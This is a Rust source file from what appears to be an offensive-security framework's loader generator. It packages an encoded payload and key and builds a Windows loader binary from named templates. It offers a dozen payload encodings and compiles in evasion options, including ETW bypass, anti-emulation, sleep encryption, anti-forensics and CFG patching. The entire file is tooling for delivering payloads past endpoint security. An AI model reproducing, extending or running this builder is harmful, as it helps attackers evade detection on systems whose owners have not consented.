//! Template-based loader generation
//! Integrates with malefic-loader templates

use super::LoaderGenerator;
use anyhow::Result;
use std::process::Command;

use crate::config::EvaderConfig;

/// All available loader template names (Community Edition)
pub const LOADER_NAMES: &[&str] = &[
    "basic_template",
    "func_ptr",
];

/// Encoding type to feature name mapping
pub const ENCODING_FEATURES: &[(&str, &str)] = &[
    ("xor", "enc_xor"),
    ("uuid", "enc_uuid"),
    ("mac", "enc_mac"),
    ("ipv4", "enc_ipv4"),
    ("base64", "enc_base64"),
    ("base45", "enc_base45"),
    ("base58", "enc_base58"),
    ("aes", "enc_aes"),
    ("aes2", "enc_aes2"),
    ("des", "enc_des"),
    ("chacha", "enc_chacha"),
    ("rc4", "enc_rc4"),
];

/// Template loader configuration
#[derive(Debug, Clone)]
pub struct TemplateLoader {
    pub template_name: Option<String>,
    pub encoding: Option<String>,
    pub debug: bool,
    pub evader: Option<EvaderConfig>,
}

impl Default for TemplateLoader {
    fn default() -> Self {
        Self {
            template_name: None,
            encoding: None,
            debug: false,
            evader: None,
        }
    }
}

impl TemplateLoader {
    /// Create with specific template
    pub fn with_template(name: &str) -> Self {
        Self {
            template_name: Some(name.to_string()),
            encoding: None,
            debug: false,
            evader: None,
        }
    }

    /// Create with random template selection
    pub fn random() -> Self {
        Self {
            template_name: Some(random_loader().to_string()),
            encoding: None,
            debug: false,
            evader: None,
        }
    }

    /// Set encoding method
    pub fn with_encoding(mut self, encoding: &str) -> Self {
        self.encoding = Some(encoding.to_lowercase());
        self
    }

    /// Enable debug output
    pub fn with_debug(mut self, debug: bool) -> Self {
        self.debug = debug;
        self
    }

    /// Attach evader configuration (controls which evasion features are compiled in)
    pub fn with_evader(mut self, evader: EvaderConfig) -> Self {
        self.evader = Some(evader);
        self
    }

    /// Get selected template name (random if not specified)
    pub fn get_template(&self) -> &str {
        self.template_name
            .as_deref()
            .unwrap_or_else(|| random_loader())
    }

    /// List all available templates
    #[allow(dead_code)]
    pub fn list_templates() -> &'static [&'static str] {
        LOADER_NAMES
    }

    /// Get the encoding feature name for a given encoding type
    fn encoding_feature(encoding: &str) -> Result<&'static str> {
        let enc_lower = encoding.to_lowercase();
        for &(name, feature) in ENCODING_FEATURES {
            if name == enc_lower {
                return Ok(feature);
            }
        }
        anyhow::bail!(
            "Unknown encoding: {}. Available: {}",
            encoding,
            ENCODING_FEATURES
                .iter()
                .map(|(n, _)| *n)
                .collect::<Vec<_>>()
                .join(", ")
        );
    }

    /// Write encoded payload + key + extra to generated/ directory
    pub fn write_payload(encoded: &[u8], key: &[u8], extra: &[u8]) -> Result<()> {
        let gen_dir = std::path::Path::new("malefic-starship/generated");
        std::fs::create_dir_all(gen_dir)?;
        std::fs::write(gen_dir.join("payload.enc"), encoded)?;
        std::fs::write(gen_dir.join("payload.key"), key)?;
        std::fs::write(gen_dir.join("payload.extra"), extra)?;
        Ok(())
    }

    /// Clear generated payload files (reset to empty)
    pub fn clear_payload() -> Result<()> {
        let gen_dir = std::path::Path::new("malefic-starship/generated");
        std::fs::create_dir_all(gen_dir)?;
        std::fs::write(gen_dir.join("payload.enc"), b"")?;
        std::fs::write(gen_dir.join("payload.key"), b"")?;
        std::fs::write(gen_dir.join("payload.extra"), b"")?;
        Ok(())
    }

    /// Build the loader binary
    pub fn build(&self, release: bool, target: &str) -> Result<std::path::PathBuf> {
        let template = self.get_template();

        // Validate template name
        if !LOADER_NAMES.contains(&template) {
            anyhow::bail!("Unknown template: {}", template);
        }

        // Build features string
        let mut features = vec![template.to_string()];

        if let Some(ref enc) = self.encoding {
            let enc_feature = Self::encoding_feature(enc)?;
            features.push(enc_feature.to_string());
            features.push("embedded_payload".to_string());
        }

        if self.debug {
            features.push("debug".to_string());
        }

        // Append evader features from config
        if let Some(ref e) = self.evader {
            if e.anti_emu {
                features.push("evader_anti_emu".to_string());
            }
            if e.etw_pass {
                features.push("evader_etw_pass".to_string());
            }
            if e.god_speed {
                features.push("evader_god_speed".to_string());
            }
            if e.sleep_encrypt {
                features.push("evader_sleep_encrypt".to_string());
            }
            if e.anti_forensic {
                features.push("evader_anti_forensic".to_string());
            }
            if e.cfg_patch {
                features.push("evader_cfg_patch".to_string());
            }
            if e.api_untangle {
                features.push("evader_api_untangle".to_string());
            }
            if e.normal_api {
                features.push("evader_normal_api".to_string());
            }
        }

        let features_str = features.join(",");

        let mut cmd = Command::new("cargo");
        cmd.arg("+nightly-2023-09-18")
            .arg("build")
            .arg("--manifest-path")
            .arg("malefic-starship/Cargo.toml")
            .arg("--target")
            .arg(target)
            .arg("--features")
            .arg(&features_str);

        if release {
            cmd.arg("--release");
        }

        let output = cmd.output()?;
        if !output.status.success() {
            anyhow::bail!("Build failed: {}", String::from_utf8_lossy(&output.stderr));
        }

        let profile = if release { "release" } else { "debug" };
        let ext = if target.contains("windows") {
            ".exe"
        } else {
            ""
        };
        let binary_path = std::path::PathBuf::from(format!(
            "malefic-starship/target/{}/{}/starship{}",
            target, profile, ext
        ));

        Ok(binary_path)
    }
}

/// Get a random loader name
pub fn random_loader() -> &'static str {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos() as usize;
    LOADER_NAMES[seed % LOADER_NAMES.len()]
}

impl LoaderGenerator for TemplateLoader {
    fn generate(&self, _payload: &[u8]) -> Result<Vec<u8>> {
        let path = self.build(true, "x86_64-pc-windows-gnu")?;
        std::fs::read(&path).map_err(|e| anyhow::anyhow!("Failed to read binary: {}", e))
    }

    fn name(&self) -> &'static str {
        "template"
    }
}
